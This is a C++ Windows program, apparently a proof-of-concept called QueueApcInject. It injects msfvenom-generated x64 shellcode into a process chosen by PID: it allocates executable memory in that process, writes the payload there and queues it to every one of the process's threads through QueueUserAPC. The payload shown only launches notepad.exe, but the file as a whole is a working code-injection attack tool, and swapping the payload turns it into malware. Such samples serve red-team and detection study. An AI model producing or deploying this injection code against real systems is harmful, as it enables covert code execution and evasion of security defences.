#include <iostream>
#include <Windows.h>
#include <Tlhelp32.h>
#include <vector>  // std::vector, like List<T> in C# (or ArrayList<T> in Java)
int Error(const char* text) 
{
  printf("%s (%u)\n", text, GetLastError());
  return 1;
}
std::vector<DWORD> GetProcessThreads(DWORD pid) 
{
  std::vector<DWORD> threadIDs;
  auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
  if (hSnapshot == INVALID_HANDLE_VALUE)
  return threadIDs;
  THREADENTRY32 te32 = { sizeof(te32) };
  if (Thread32First(hSnapshot, &te32)) 
  {
   do {
         if (te32.th32OwnerProcessID == pid) 
         {
         threadIDs.push_back(te32.th32ThreadID);
         }
     } 
     while (Thread32Next(hSnapshot, &te32));
 }
 CloseHandle(hSnapshot);
 return threadIDs;
}
int main(int argc, const char* argv[]) 
{
 if (argc < 2) 
 {
  printf("Usage: QueueApcInject <PID>\n");
  return 0;
 }
  int pid = atoi(argv[1]);
  HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
  if (!hProcess)
  return Error("Failed to Open Process");
  // msfvenom -p windows/x64/exec CMD=notepad.exe -f c
  unsigned char shellcode[] =
  "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
  "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
  "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
  "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
  "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
  "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
  "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
  "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
  "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
  "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
  "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
  "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
  "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
  "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
  "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
  "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
  "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
  "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x6e\x6f\x74"
  "\x65\x70\x61\x64\x2e\x65\x78\x65\x00";
  LPVOID allocation_start;
  SIZE_T allocation_size = sizeof(shellcode);
  allocation_start = VirtualAllocEx(hProcess, NULL, allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (!allocation_start)
    return Error("Failed to allocate memory");
 
  WriteProcessMemory(hProcess, allocation_start, shellcode, allocation_size, NULL);
 
  auto threadIDs = GetProcessThreads(pid);
  if (threadIDs.empty()) 
  {
    printf("Failed to locate threads in process %u\n", pid);
    return 1;
  }
  for (const DWORD Threadid : threadIDs) 
  {
    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, Threadid);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)allocation_start;
    if (hThread) 
    {
      QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL);
      CloseHandle(hThread);
    }
  }
  printf("APC Queued!\n");
  CloseHandle(hProcess);
  return 0;
}
